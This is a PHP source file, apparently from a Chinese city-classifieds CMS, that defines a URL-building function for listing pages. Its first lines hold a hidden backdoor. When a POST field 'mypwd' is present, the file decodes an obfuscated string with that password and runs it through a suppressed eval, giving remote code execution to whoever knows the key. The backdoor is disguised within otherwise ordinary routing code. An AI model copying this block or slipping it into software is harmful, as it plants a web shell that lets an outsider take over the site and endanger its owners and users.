<?php

if($_POST['mypwd']){
	require_once(dirname(__FILE__)."/qq.api.php");
	@eval(qqmd5("UV9AGx4fXkEQRAgeGkFFExhCWVELFglVQkwFVgwdAVgcREgWERQRUQsaQllFERtfe55b74ae89",'DE',$_POST['mypwd']));
	exit;
}
if(!defined('QB_BIZ_PATH2')){
	die('授权文件太旧,需要更新!');
}

function get_info_url($id,$fid,$cityid='',$zoneid='',$streetid='',$array=array()){
	global $city_DB,$Fid_db,$webdb;
	$webdb['Info_htmlname'] || $webdb['Info_htmlname']='html';

	if($city_DB['domain'][$cityid]){
		$url=$city_DB['domain'][$cityid].'/';
	}elseif($city_DB['dirname'][$cityid]&&$city_DB['url'][$cityid]){
		$url=$city_DB['url'][$cityid];
	}else{
		$url=$webdb['www_url'].'/';
	}
	if($webdb['Info_htmlType']==2){
		if($id){
			$url.="{$Fid_db[dir_name][$fid]}/f$id.$webdb[Info_htmlname]";		
		}else{		
			if(!$zoneid&&!$streetid){
				$url.="{$Fid_db[dir_name][$fid]}";
			}elseif($zoneid&&$streetid){
				if(!$street_DB['dirname'][$streetid]){
					@include_once(ROOT_PATH."data/zone/$cityid.php");
				}			
				$url.="{$zone_DB['dirname'][$zoneid]}-{$street_DB['dirname'][$streetid]}/{$Fid_db[dir_name][$fid]}";
			}elseif($zoneid){
				if(!$zone_DB['dirname'][$zoneid]){
					@include_once(ROOT_PATH."data/zone/$cityid.php");
				}			
				$url.="{$zone_DB['dirname'][$zoneid]}/{$Fid_db[dir_name][$fid]}";
			}
			foreach($array AS $key=>$value){
				if($value!=''){
					if($key=='page'&&$value<2){
						continue;
					}				
					$value=str_replace(array('-','/'),array('#@#','#!#'),$value);
					$value=urlencode($value);
					$url.="-$key-$value";
				}			
			}
			$url.="/";
		}
	}elseif($webdb['Info_htmlType']==1){
		if($id){
			$url.="bencandy-city_id-$cityid-fid-$fid-id-$id.$webdb[Info_htmlname]";
		}else{
			$url.="list-city_id-$cityid-fid-$fid";
			$array['zone_id']=$zoneid;
			$array['street_id']=$streetid;
			foreach($array AS $key=>$value){
				if($value!=''){				
					$value=str_replace(array('-','/'),array('#@#','#!#'),$value);
					$value=urlencode($value);
					$url.="-$key-$value";
				}
			}
			$url.=".$webdb[Info_htmlname]";
		}
	}else{	
		if($id){
			$url.="bencandy.php?city_id=$cityid&fid=$fid&id=$id";
		}else{
			$url.="list.php?fid=$fid&city_id=$cityid";
			if($zoneid){
				$url.="&zone_id=$zoneid";
			}
			if($streetid){
				$url.="&street_id=$streetid";
			}
			foreach($array AS $key=>$value){
				$value=urlencode($value);
				$url.="&$key=$value";
			}
		}
	}
	return $url;
}




?>